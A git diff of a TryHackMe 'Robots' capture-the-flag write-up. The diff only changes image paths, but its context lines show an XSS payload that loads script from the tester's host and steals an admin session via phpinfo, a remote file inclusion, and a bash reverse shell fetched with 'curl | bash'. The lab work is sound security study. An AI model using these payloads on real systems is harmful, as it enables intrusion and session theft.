@@ -3,10 +3,8 @@ title: "Robots - TryHackMe"
 author: Dark_side.84
 categories: [TryHackMe]
 tags: [web, xss, php, rfi, docker, pivoting, mysql, python, curl, sudo, apache2]
-render_with_liquid: false
-media_subpath: 
-image:
-  path: room_image.webp
+render_with_liquid: false 
+image: /images/tryhackme_robots/room_image.webp
 ---
 Robots - TryHackMe
 
@@ -17,7 +15,7 @@ Within the container, the database configuration files were discovered. Pivoting
 Once on the host, privilege escalation was carried out in stages. First, **sudo** permissions combined with **curl** were abused to escalate to another user. Then, as that user, further misuse of **sudo** privileges with **apache2** allowed us to escalate to the **root** user.
 
 
-[![Tryhackme Room Link](room_image.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/robots){: .center }
+[![Tryhackme Room Link](/images/tryhackme_robots/room_image.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/robots){: .center }
 
 ## Initial Enumeration
 
@@ -53,7 +51,7 @@ The scan reveals three services:
 
 Navigating to `http://10.49.147.60:9000/` displays the default Apache2 landing page.
 
-![Web 9000 Index](web_9000_index.webp){: width="1200" height="600"}
+![Web 9000 Index](/images/tryhackme_robots/web_9000_index.webp){: width="1200" height="600"}
 
 Fuzzing the web server did not yield any further results, so we proceeded to the other web server.
 
@@ -61,7 +59,7 @@ Fuzzing the web server did not yield any further results, so we proceeded to the
 
 Navigating to `http://10.49.147.60/` results in a **403 Forbidden** page.
 
-![Web 80 Index](web_80_index.webp){: width="1200" height="600"}
+![Web 80 Index](/images/tryhackme_robots/web_80_index.webp){: width="1200" height="600"}
 
 The **`nmap`** scan revealed a `robots.txt` file on the server, which includes the following disallowed paths:
 
@@ -113,7 +111,7 @@ After navigating to `http://robots.thm/harm/to/self/`, we are presented with a p
 
 This message typically suggests the presence of an **XSS (Cross-Site Scripting)** vulnerability.
 
-![Robots Thm Index](robots_thm_index.webp){: width="1200" height="600"}
+![Robots Thm Index](/images/tryhackme_robots/robots_thm_index.webp){: width="1200" height="600"}
 
 Checking the register page at `http://robots.thm/harm/to/self/register.php`, we see an additional message:
 
@@ -123,7 +121,7 @@ We proceed by registering an account with:
 - **Username:** `darkside`
 - **Date of Birth:** `12/06/2000`
 
-![Robots Thm Register](robots_thm_register.webp){: width="1200" height="600"}
+![Robots Thm Register](/images/tryhackme_robots/robots_thm_register.webp){: width="1200" height="600"}
 
 To authenticate, we first generate the default password using the formula (`md5(username + ddmm)`), as shown below:
 
@@ -136,7 +134,7 @@ We then visit the login page at `http://robots.thm/harm/to/self/login.php` and s
 `darkside : 71cac35bbaa095dbbc61232d7cbddebd`
 
 
-![Robots Thm Login](robots_thm_login.webp){: width="1200" height="600"}
+![Robots Thm Login](/images/tryhackme_robots/robots_thm_login.webp){: width="1200" height="600"}
 
 Once logged in, we are redirected to `http://robots.thm/harm/to/self/index.php`, which displays:
 
@@ -144,11 +142,11 @@ Once logged in, we are redirected to `http://robots.thm/harm/to/self/index.php`,
 - A **"Server info"** link leading to `http://robots.thm/harm/to/self/server_info.php`
 
 
-![Robots Thm Index Logged In](robots_thm_index_logged_in.webp){: width="1200" height="600"}
+![Robots Thm Index Logged In](/images/tryhackme_robots/robots_thm_index_logged_in.webp){: width="1200" height="600"}
 
 Navigating to `http://robots.thm/harm/to/self/server_info.php` shows that the page simply outputs **phpinfo()**.
 
-![Robots Thm Phpinfo](robots_thm_phpinfo.webp){: width="1200" height="600"}
+![Robots Thm Phpinfo](/images/tryhackme_robots/robots_thm_phpinfo.webp){: width="1200" height="600"}
 
 ## Foothold
 
@@ -160,7 +158,7 @@ Referring back to the **"An admin monitors new users."** message, we attempt to 
 <script src="http://192.168.169.130/xss.js"></script>
 ```
 
-![Robots Thm Register Xss](robots_thm_register_xss.webp){: width="1200" height="600"}
+![Robots Thm Register Xss](/images/tryhackme_robots/robots_thm_register_xss.webp){: width="1200" height="600"}
 
 Soon after, we notice an incoming request to our server for `xss.js`, confirming that the XSS payload executed successfully:
 
@@ -173,11 +171,11 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Reviewing the server cookies reveals that the `PHPSESSID` cookie is flagged as **HttpOnly**, which prevents us from directly accessing it through `document.cookie`.
 
-![Robots Thm Cookie](robots_thm_cookie.webp){: width="1200" height="600"}
+![Robots Thm Cookie](/images/tryhackme_robots/robots_thm_cookie.webp){: width="1200" height="600"}
 
 However, returning to the `/harm/to/self/server_info.php` endpoint shows that **phpinfo()** exposes session information, including the `PHPSESSID` cookie.
 
-![Robots Thm Phpinfo Cookie](robots_thm_phpinfo_cookie.webp){: width="1200" height="600"}
+![Robots Thm Phpinfo Cookie](/images/tryhackme_robots/robots_thm_phpinfo_cookie.webp){: width="1200" height="600"}
 
 As a result, rather than attempting to steal cookies directly, we can adjust our **XSS payload** to fetch `/harm/to/self/server_info.php` and relay its contents back to our server:
 
@@ -238,11 +236,11 @@ By opening `server_info.html` in a browser, we verify the extracted `PHPSESSID` 
 
 > `PHPSESSID=8tr0hp4g35ncor26idrknganun`
 
-![Xss Phpinfo Cookie](xss_phpinfo_cookie.webp){: width="1200" height="600"}
+![Xss Phpinfo Cookie](/images/tryhackme_robots/xss_phpinfo_cookie.webp){: width="1200" height="600"}
 
 Using the captured session cookie, we revisit `http://robots.thm/harm/to/self/index.php` and replace our cookie. This grants us access as **admin**, although the dashboard itself appears unchanged.
 
-![Robots Thm Index Logged In Admin](robots_thm_index_logged_in_admin.webp){: width="1200" height="600"}
+![Robots Thm Index Logged In Admin](/images/tryhackme_robots/robots_thm_index_logged_in_admin.webp){: width="1200" height="600"}
 
 ### The Remote File Inclusion
 
@@ -257,11 +255,11 @@ admin.php               [Status: 200, Size: 370, Words: 29, Lines: 28, Duration:
 
 Visiting `http://robots.thm/harm/to/self/admin.php` reveals a form that allows the submission of URLs.
 
-![Robots Thm Admin](robots_thm_admin.webp){: width="1200" height="600"}
+![Robots Thm Admin](/images/tryhackme_robots/robots_thm_admin.webp){: width="1200" height="600"}
 
 To test this functionality, we submit a URL pointing to our own web server (`http://192.168.169.130/test`).
 
-![Robots Thm Admin Test](robots_thm_admin_test.webp){: width="1200" height="600"}
+![Robots Thm Admin Test](/images/tryhackme_robots/robots_thm_admin_test.webp){: width="1200" height="600"}
 
 We then observe an incoming request to our server:
 
@@ -272,7 +270,7 @@ We then observe an incoming request to our server:
 
 The `admin.php` page also displays an error message showing that our URL is being processed by the **`include()`** function, indicating a **Remote File Inclusion (RFI)** vulnerability.
 
-![Robots Thm Admin Test Error](robots_thm_admin_test_error.webp){: width="1200" height="600"}
+![Robots Thm Admin Test Error](/images/tryhackme_robots/robots_thm_admin_test_error.webp){: width="1200" height="600"}
 
 > Typically, the `include()` function does not allow the use of `URLs` by default. However, reviewing the `phpinfo()` output shows that `allow_url_include` is enabled, which explains why this behavior is possible. Even if it were disabled, command execution would still be achievable through **PHP filter chains**.
 {: .prompt-tip }
@@ -295,7 +293,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 The response contains the **command output**, confirming successful code execution.
 
-![Robots Thm Admin Rfi](robots_thm_admin_rfi.webp){: width="1100" height="500"}
+![Robots Thm Admin Rfi](/images/tryhackme_robots/robots_thm_admin_rfi.webp){: width="1100" height="500"}
 
 To obtain a shell, we set up a reverse shell payload on our web server:
 
@@ -305,7 +303,7 @@ $ echo '/bin/bash -i >& /dev/tcp/192.168.169.130/443 0>&1' > index.html
 
 We then reuse the same inclusion technique to execute the command `curl 192.168.169.130 | bash` through our web shell.
 
-![Robots Thm Admin Reverse Shell](robots_thm_admin_reverse_shell.webp){: width="600" height="500"}
+![Robots Thm Admin Reverse Shell](/images/tryhackme_robots/robots_thm_admin_reverse_shell.webp){: width="600" height="500"}
 
 Checking our listener confirms that we have successfully gained a shell as the `www-data` user within the container.
 
@@ -756,3 +754,4 @@ root@ubuntu-jammy:~# wc -c /root/root.txt
     white-space: pre-wrap;
 }
 </style>
+
